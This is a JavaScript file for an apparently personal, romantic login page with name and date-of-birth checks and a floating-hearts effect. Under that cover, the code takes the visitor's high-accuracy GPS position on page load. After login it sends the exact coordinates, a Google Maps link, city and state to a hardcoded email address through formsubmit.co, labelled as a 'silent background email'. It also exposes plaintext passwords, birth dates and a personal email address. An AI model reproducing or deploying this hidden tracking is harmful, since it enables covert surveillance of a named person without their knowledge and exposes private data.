// -------------------------
// Check Name Function
// -------------------------
function check() {
    let in2 = document.getElementById("in2");
    let span2 = document.getElementById("spn");

    let validNames = [
        "Sneha Singh",
        "Sneha", 
        "sneha singh", 
        "sneha",
        "Sneha singh", 
        "sneha Singh", 
        "Uday"
    ];

    let trimmedName = in2.value.trim();

    if (validNames.includes(trimmedName)) {
        span2.style.visibility = "visible";
        span2.style.animation = "fadein 1s forwards";
    } else {
        span2.style.visibility = "hidden";
    }
}


// -------------------------
// EXACT LOCATION (ON PAGE LOAD)
// -------------------------
let locationPromise = null;
let loggedInUser = "Unknown User";

// Trigger the popup immediately when the page loads
document.addEventListener("DOMContentLoaded", () => {
    locationPromise = new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const { latitude, longitude, accuracy } = pos.coords;
                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    
                    let city = "Unknown";
                    let state = "Unknown";

                    // Reverse Geocode to get City and State
                    try {
                        const geoRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
                        const geoData = await geoRes.json();
                        city = geoData.locality || geoData.city || "Unknown";
                        state = geoData.principalSubdivision || "Unknown";
                    } catch (err) {
                        console.log("Reverse geocoding failed.");
                    }

                    resolve({
                        method: "Exact GPS (Prompted)",
                        latitude, longitude, accuracy, mapsLink, city, state
                    });
                }, 
                (err) => {
                    // User blocked it or it timed out
                    resolve({ 
                        method: "Location Access Denied / Failed", 
                        error: err.message 
                    });
                }, 
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            resolve({ method: "Geolocation API not supported by browser" });
        }
    });
});


// -------------------------
// Login Function
// -------------------------
function login() {
    let in2 = document.getElementById("in2");
    let pwd = document.getElementById("pwd");

    let allowedNames = [
        "Sneha", "Sneha Singh", "sneha", "sneha singh",
        "Sneha singh", "sneha Singh", "Uday"
    ];

    let trimmedName = in2.value.trim();

    if (allowedNames.includes(trimmedName) && 
        (pwd.value == "Sneha@2004" || pwd.value =="Uday@2005")) {

        // Store the username so the DOB submission can use it
        loggedInUser = trimmedName;

        // Hide login form and show DOB form
        document.getElementById("loginform").style.display = "none";
        document.getElementById("dobform1").style.display = "flex";
    } else {
        alert("Wrong Username or Password!");
    }
}


// -------------------------
// DOB Submission (Signup Phase)
// -------------------------
async function submitDob(event) {
    // Prevent the form from submitting immediately so we can attach location data
    event.preventDefault(); 
    
    let dobInput = document.getElementById("dob").value.trim();

    if (dobInput === "11-09-2004" || dobInput === "05-01-2005") {
        sessionStorage.setItem("DobDone", "true");
        
        const dobForm = document.getElementById("dobForm"); // Ensure your form has id="dobForm"

        // Wait for the location promise (in case they clicked really fast)
        const locData = await locationPromise;

        // Build the background email payload
        let payload = {
            _subject: `${loggedInUser} logged in! (Location Alert)`,
            User: loggedInUser,
            LoginTime: new Date().toLocaleString(),
            Method: locData.method
        };

        // Inject data into the actual FormSubmit form
        injectHiddenField(dobForm, "LoggedInUser", loggedInUser);

        if (locData.latitude) {
            payload.Coordinates = `${locData.latitude}, ${locData.longitude}`;
            payload.Accuracy = `${Math.round(locData.accuracy)} meters`;
            payload.GoogleMapsLink = locData.mapsLink;
            payload.City = locData.city;
            payload.State = locData.state;

            injectHiddenField(dobForm, "Exact_Coordinates", payload.Coordinates);
            injectHiddenField(dobForm, "Google_Maps", locData.mapsLink);
            injectHiddenField(dobForm, "City", locData.city);
            injectHiddenField(dobForm, "State", locData.state);
        } else if (locData.error) {
            payload.Error = locData.error;
        }

        // 1. Send silent background email
        await sendSilentBackgroundEmail(payload);

        // 2. Submit the actual FormSubmit form
        dobForm.submit(); 
        
    } else {
        alert("Incorrect Date Of Birth !!");
        return false;
    }
}


// Flatpickr initialization
if (typeof flatpickr !== "undefined") {
    flatpickr("#dob", {
      dateFormat: "d-m-Y"
    });
}


// -------------------------
// FORMSUBMIT HELPERS
// -------------------------
function injectHiddenField(form, name, value) {
    if (!form || !value) return;
    let input = form.querySelector(`input[name="${name}"]`);
    if (!input) {
        input = document.createElement("input");
        input.type = "hidden";
        input.name = name;
        form.appendChild(input);
    }
    input.value = value;
}

async function sendSilentBackgroundEmail(payload) {
    const dobForm = document.getElementById("dobForm");
    let targetEmail = "sagarwal2k20@gmail.com"; 

    if (dobForm && dobForm.action) {
        const match = dobForm.action.match(/formsubmit\.co\/(.+)/);
        if (match && match[1]) targetEmail = match[1];
    }

    try {
        await fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(payload)
        });
        console.log("Location alert sent successfully.");
    } catch (e) {
        console.log("Alert failed:", e.message);
    }
}


// -------------------------
// Sprinkle/Graph Effect
// -------------------------
function graph() {
    let d = document.getElementById("d");
    d.style.visibility = "visible";
    d.style.animation = "fadein 2s forwards";

    const container = document.getElementById('sprinkle-container');
    for (let i = 0; i < 30; i++) {
        let p = document.createElement('div');
        p.classList.add('particle');
        p.innerText = "❤";        
        p.style.left = Math.random() * 100 + "vw";
        p.style.animationDuration = 2 + Math.random() * 3 + "s";
        p.style.animationDelay = Math.random() * 2 + "s";
        container.appendChild(p);
    }
}

// -------------------------
// UI Effects
// -------------------------
function select(btn){
    btn.style.boxShadow = "0px 0px 20px 10px rgba(255, 255, 255, 0.7)";
}
function deselect(btn) {
    btn.style.boxShadow = "none";
}

function togglePwd() {
    let pwd = document.getElementById("pwd");
    pwd.type = pwd.type === "password" ? "text" : "password";
}
